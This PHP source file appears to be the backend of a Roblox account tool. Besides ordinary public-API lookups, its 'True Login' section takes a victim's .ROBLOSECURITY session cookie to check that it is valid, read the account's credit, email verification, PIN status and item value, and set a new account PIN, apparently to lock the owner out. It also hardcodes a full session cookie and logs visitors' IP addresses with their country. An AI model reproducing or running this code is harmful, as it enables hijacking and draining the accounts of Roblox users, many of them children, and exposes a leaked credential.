<?php
function request($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
	
function get_csrf()
{
    $post_fields = "{\"cvalue\":\"username\",\"ctype\":\"Username\",\"password\":\"password\",\"captchaToken\":\"token\",\"captchaProvider\":\"PROVIDER_ARKOSE_LABS\"}";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v2/login");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    $headers = get_headers_from_curl_response($result);
    $csrf = $headers["x-csrf-token"];
    return $csrf;
}

function generateRandomToken($length)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function generateRandomString($length)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function random_float($min, $max)
{
    return ($min + lcg_value() * (abs($max - $min)));
}

function get_headers_from_curl_response($response)
{
    $headers = array();

    $header_text = substr($response, 0, strpos($response, "\r\n\r\n"));

    foreach (explode("\r\n", $header_text) as $i => $line)
        if ($i === 0)
            $headers['http_code'] = $line;
        else {
            list($key, $value) = explode(': ', $line);

            $headers[$key] = $value;
        }

    return $headers;
}

function requestGroupApi($id)
{
    $getGroupApi = request("https://groups.roblox.com/v1/groups/$id");
    return json_decode($getGroupApi);
}

function requestId($username)
{
    $getId = request("https://api.roblox.com/users/get-by-username?username=$username");
    if (strpos($getId, 'Id') !== false) {
        $idDecode = json_decode($getId);
        $id = $idDecode->Id;
        return $id;
    } else {
        return "Not Exist";
    }
    return;
}

function requestAvatarHeadshot($id)
{
    $getAvatarHeadshot = request("https://www.roblox.com/headshot-thumbnail/json?userId=$id&width=150&height=150");
    return json_decode($getAvatarHeadshot);
}

function requestGroup($id, $groupName)
{
    $getGroup = request("https://www.roblox.com/groups/$id/$groupName#!/about");
    return strval($getGroup);
}

function requestVerify($userId)
{
    $getVerify1 = request("https://api.roblox.com/ownership/hasasset?userId=$userId&assetId=102611803");
    if ($getVerify1 == "false") {
        $getVerify2 = request("https://api.roblox.com/ownership/hasasset?userId=$userId&assetId=1567446");
        if ($getVerify2 == "false") {
            return "Unverified";
        } else {
            return "Verified";
        }
    } else {
        return "Verified";
    }
    return;
}

function requestAge($id)
{
    $getDateBirth = request("https://users.roblox.com/v1/users/$id");
    $jsonDateBirth = json_decode($getDateBirth);
    preg_match('/(?<=)(.*?)(?=T)/', $jsonDateBirth->created, $result);
    $dateBirth = $result[0];
    $Today = date("Y-m-d");
    $Count = date_diff(date_create($dateBirth), date_create($Today));
    return $Count->days . " Days";
}

function requestPremium($id)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://premiumfeatures.roblox.com/v1/users/$id/validate-membership");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: .ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_358C1BE3BCD5A19382FF828AFCFB7B8C9395D0C215A4E43F606CDF61DB289BF8FD13A64577DF01B370C3055F26EA6C334A27F5CC523C7464DDD95AB681B6B8C34D5972E20A2A25DB76C4A5245DBC0F8FBC66FA105CA929B1F2C980CF3193DB5C114374FCE5516A9D918A97376056BD49F78B0D4347B0A2D40B65F494E35F695E136E6E15060382C16C633504F6428A98256D18C9517403FC3F5171FE2B11637B5804DDBB190124FACB2BE307C97FD3F46F14B58D683D1DACC41EC22D06A858466E67591F22C146D98FD103B0636A8E306237DCFB6EC87C951BC243181756BB552717ABF7E6F915367B49FE361B56D570AB8261BEA049AFE5D5D6C80183E9A51EDF048B4788AD48E42904F93E059A0E89E972DF45AB0F795FD5163006844779988461A7F8"));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    if ($output == "false") {
        return "False";
    } else if ($output == "true") {
        return "True";
    } else {
        return "Error";
    }
}

function requestRap($userId)
{
    $getRap = request("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?sortOrder=Asc&limit=100");
    $rapDecode = json_decode($getRap, true);
    if (strpos($getRap, 'data') !== false) {
        $rapData = $rapDecode["data"];
        $rap = 0;
        foreach ($rapData as $rapValue) {
            $rap += $rapValue["recentAveragePrice"];
        }
        return $rap;
    } else {
        return "Private";
    }
    return;
}

function get_client_ip()
{
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if (getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if (getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if (getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if (getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if (getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

// Start of True Login
function requestCookie($url, $cookie)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: .ROBLOSECURITY=$cookie"));
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

function requestCreatePinCookie($cookie, $pin)
{
    $postFields = "{\"pin\": \"$pin\"}";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/account/pin");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: .ROBLOSECURITY=$cookie"));
    $output = curl_exec($ch);
    curl_close($ch);
    return "";
}

function requestRapCookie($userId, $cookie)
{
    $getRap = requestCookie("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?sortOrder=Asc&limit=100", $cookie);
    $rapDecode = json_decode($getRap, true);
    if (strpos($getRap, 'data') !== false) {
        $rapData = $rapDecode["data"];
        $rap = 0;
        foreach ($rapData as $rapValue) {
            $rap += $rapValue["recentAveragePrice"];
        }
        return $rap;
    } else {
        return "Private";
    }
    return;
}

function requestMobileInfoCookie($cookie)
{
    $getMobileInfo = requestCookie("https://www.roblox.com/mobileapi/userinfo", $cookie);
    return $getMobileInfo;
}

function requestPinCookie($cookie)
{
    $getPin = requestCookie("https://auth.roblox.com/v1/account/pin", $cookie);
    $getPinDecode = json_decode($getPin);
    $pin = $getPinDecode->isEnabled;
    return $pin;
}

function requestCreditCookie($cookie)
{
    $getCredit = requestCookie("https://billing.roblox.com/v1/gamecard/userdata", $cookie);
    $_Credit = str_replace('"', '', $getCredit);
    return $_Credit;
}

function requestVerifiedCookie($cookie)
{
    $getVerified = requestCookie("https://accountsettings.roblox.com/v1/email", $cookie);
    $getVerifiedDecode = json_decode($getVerified);
    if ($getVerifiedDecode->verified == False) {
        return "Unverified";
    } else {
        return "Verified";
    }
}

function requestTrueCookie($cookie)
{
    $getTrue = requestCookie("https://accountsettings.roblox.com/v1/email", $cookie);
    if (strpos($getTrue, '"message":"Authorization has been denied for this request."')) {
        return "Cookie is not valid";
    } else {
        return "Cookie is valid";
    }
}

function requestFavoriteCookie($cookie)
{
    $getFavorites = requestCookie("https://games.roblox.com/v1/games/383310974/favorites", $cookie);
    $getFavoritesDecode = json_decode($getFavorites);
    return $getFavoritesDecode->isFavorited;
}

function requestJoinDate($id)
{
    $getDateBirth = request("https://users.roblox.com/v1/users/$id");
    $jsonDateBirth = json_decode($getDateBirth);
    preg_match('/(?<=)(.*?)(?=T)/', $jsonDateBirth->created, $result);
    if ($result[0] == true) {
        $dateBirth = $result[0];
        $newDate = date("m/d/Y", strtotime($dateBirth));
        return $newDate;
    }
}

function requestIp()
{
    $ip = get_client_ip();
    if ($ip != "UNKNOWN") {
        $getIp = request("http://ip-api.com/json/$ip");
        $jsonIp = json_decode($getIp);
        return $ip . " (" . $jsonIp->country . ")";
    }
}

function requestSponsorship($id)
{
    $getSponsorship = request("https://www.roblox.com/user-sponsorship/$id");
    return $getSponsorship;
}

function getData($stringCode1)
{
    preg_match('/(?<=<ul class="border-top border-bottom game-stats-container follow-button-enabled">)(.*?)(?=<div class=game-stat-footer)/', $stringCode1, $result);
    return $result[0];
}

function requestGamepass($id)
{
    $gamepass = request("https://www.roblox.com/games/getgamepassesinnerpartial?startIndex=0&maxRows=50&placeId=$id&_=1623172034171");
    return $gamepass;
}

function getWearing($stringCode)
{
    preg_match('/(?<=<div class="section profile-avatar">)(.*?)(?=<div id=people-list-container)/', $stringCode, $result);
    return $result[0];
}

function getAssetInformation($id)
{
    $Request = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    return $Request;
}

function getStatusText($stringCode)
{
    preg_match('/(?<=data-statustext=")(.*?)(?=")/', $stringCode, $result);
    return $result[0];
}

function getStatistic($stringCode)
{
    preg_match('/(?<=<div class="section profile-statistics">)(.*?)(?=<div class=tab-pane)/', $stringCode, $result);
    return $result[0];
}

function getFavorites($stringCode)
{
    preg_match('/(?<=<div class="container-list favorite-games-container">)(.*?)(?=<div class=section)/', $stringCode, $result);
    return $result[0];
}

function getFriendsCount($stringCode)
{
    preg_match('/(?<=data-friendscount=)(.*?)(?= )/', $stringCode, $result);
    $result = $result[0];
    if (strlen($result) > 4) {
        preg_match('/.../', $result, $result);
        $result = $result[0] . "K+";
        return $result;
    } else {
        return number_format($result);
    };
}

function getFollowersCount($stringCode)
{
    preg_match('/(?<=data-followerscount=)(.*?)(?= )/', $stringCode, $result);
    $result = $result[0];
    if (strlen($result) > 4) {

        preg_match('/.../', $result, $result);
        $result = $result[0] . "K+";
        return strlen($result);
    } else {
        return number_format($result);
    }
}

function getFollowingCount($stringCode)
{
    preg_match('/(?<=data-followingscount=)(.*?)(?= )/', $stringCode, $result);
    $result =     $result[0];
    if (strlen($result) > 4) {
        preg_match('/.../', $result, $result);
        $result = $result[0] . "K+";
        return $result;
    } else {
        return number_format($result);
    }
}
// start game

function get_CURL($url)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($curl);
    curl_close($curl);

    return json_decode($result, true);
}

function requestLike($id)
{
    $getName = request("https://www.roblox.com/games/votingservice/$id");
    return $getName;
}
function requestAssetsid($id)
{
    $getName = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getName, 'AssetId') !== false) {
        $idDecode = json_decode($getName);
        $name = $idDecode->AssetId;
        return $name;
    } else {
        return "Not Exist";
    }
    return;
}
function requestName($id)
{
    $getName = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getName, 'Name') !== false) {
        $idDecode = json_decode($getName);
        $name = $idDecode->Name;
        return $name;
    } else {
        return "Not Exist";
    }
    return;
}
function requestDesc($id)
{
    $getDesc = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getDesc, 'Description') !== false) {
        $idDecode = json_decode($getDesc);
        $desc = $idDecode->Description;
        return $desc;
    } else {
        return "Not Exist";
    }
    return;
}
function requestBuilder($id)
{
    $getBuilder = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getBuilder, 'Builder') !== false) {
        $idDecode = json_decode($getBuilder);
        $builder = $idDecode->Builder;
        return $builder;
    } else {
        return "Not Exist";
    }
    return;
}
function requestBuilderlink($id)
{
    $getBuilder = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getBuilder, 'BuilderAbsoluteUrl') !== false) {
        $idDecode = json_decode($getBuilder);
        $builder = $idDecode->BuilderAbsoluteUrl;
        return $builder;
    } else {
        return "Not Exist";
    }
    return;
}
function requestUrl($id)
{
    $getUrl = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getUrl, 'Url') !== false) {
        $idDecode = json_decode($getUrl);
        $Url = $idDecode->Url;
        return $Url;
    } else {
        return "Not Exist";
    }
    return;
}
function requestUniverse($id)
{
    $getUniverseId = request("https://www.roblox.com/places/api-get-details?assetId=$id");
    if (strpos($getUniverseId, 'UniverseId') !== false) {
        $idDecode = json_decode($getUniverseId);
        $uni = $idDecode->UniverseId;
        return $uni;
    } else {
        return "Not Exist";
    }
    return;
}
?>